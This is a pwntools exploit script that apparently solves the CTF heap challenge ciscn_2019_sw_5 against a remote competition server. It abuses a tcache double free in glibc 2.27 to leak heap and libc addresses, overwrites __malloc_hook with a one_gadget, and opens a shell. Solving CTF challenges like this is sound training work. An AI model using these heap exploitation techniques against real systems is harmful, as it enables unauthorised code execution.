from pwn import *
from LibcSearcher import *

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('../ciscn_2019_sw_5')
libc = ELF('/home/kali/libc-database/db/libc6_2.27-3ubuntu1.5_amd64.so')
target = remote('node4.buuoj.cn', 28319)
# target = process('./ciscn_2019_sw_5')

one_gadget_18 = [0x4f2c5,0x4f322,0x10a38c]

def allocate(title, content):
  target.sendlineafter('>> ', '1')
  target.sendafter('title:\n', title)
  target.sendafter('content:\n', content)

def free(index):
  target.sendlineafter('>> ', '2')
  target.sendlineafter('index:\n', str(index))

# We only have three chances to call delete function...
allocate('abcd', 'abcd')
allocate('abcd', 'abcd')

# Double free will cause the tcache bin contain identical chunks.
# So after we allocate a new chunk, we can see all the contents filled by
# libc, and can rewrite something thing into it to reveal information of interest.
# Double freeing in tcache under libc-2.27 is completely fine; however, for higher versions of libc,
# this will trigger double free check, and program will finally throw an exception :(
free(0)
free(0)

# Rewrite the lower byte of fd to 0x80.
allocate(b'\x80', 'aa\n')
heap_base = u64(target.recvuntil('aa\n')[0:6].ljust(8, b'\x00')) - 0x280
print('[+] The heap address is {}'.format(hex(heap_base)))

allocate(p64(heap_base + 0x20), p64(heap_base + 0x20) * 5)
allocate(p64(heap_base + 0x20), p64(heap_base + 0x20) * 5)
payload  = (b'\xf9' * 0x8) * 6
payload += p64(0x250 - 0x50 + 1) + p64(0) * 4 + p64(heap_base + 0x60)
allocate(b'\xaa' * 0x8, payload)

payload = p64(0) * 3 + p64(heap_base + 0x60)
allocate(p64(0x0), payload)
free(6)

payload = p64(0) * 3 + p64(heap_base + 0x60)
allocate(b'\x30', payload)

malloc_hook = u64(target.recvuntil(b'\x7f').ljust(8, b'\x00'))
libc.address = malloc_hook - libc.sym['__malloc_hook']
one_gadget = libc.address + one_gadget_18[1]
payload = p64(0) * 3 + p64(malloc_hook)
allocate(p64(0), payload)
allocate(p64(one_gadget), 'a')

target.sendlineafter('>> ', '1')
target.interactive()